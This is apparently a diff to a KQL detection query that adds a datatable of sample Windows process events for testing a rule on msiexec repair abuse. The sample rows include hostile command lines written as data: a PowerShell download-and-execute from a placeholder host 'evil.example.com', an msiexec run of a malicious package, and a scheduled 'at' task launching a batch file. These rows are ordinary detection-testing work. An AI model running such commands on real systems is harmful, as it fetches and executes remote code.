@@ -118,3 +118,18 @@ process_events
 //| where FileName =~ "msiexec.exe"
 //| where ProcessCommandLine contains "/fa" and ProcessCommandLine contains ":\\windows\\installer"
 | project Timestamp, FileName, ProcessCommandLine, Severity
+
+
+
+
+
+
+
+
+datatable(UniqueID:int, Timestamp:datetime, DeviceID:string, ProcessID:int, ProcessCommandLine:string, FileName:string, FolderPath:string, EventType:string, Severity:string, IsAuditRecord:bool)
+[
+    (1,'2023-01-01T00:00:00Z',"Device001",1234,"msiexec.exe /fa maliciousapp.msi /quiet","msiexec.exe","C:\\Windows\\system32","T1021","Medium",true),
+    (2,'2023-01-02T02:30:00Z',"Device002",2345,"powershell.exe -exec bypass -c 'IEX (iwr 'https://evil.example.com/malware.ps1')'","powershell.exe","C:\\Windows\\System32\\WindowsPowerShell\\v1.0","T1059","High",true),
+    //... Add the remaining rows here
+    (50,'2023-02-23T10:43:33Z',"Device050",1050,"at 09:00 /every:M,T,W,Th,F,S,Su C:\\temp\\malicious.bat","at.exe","C:\\Windows\\system32","T1053.005","Medium",true)
+]
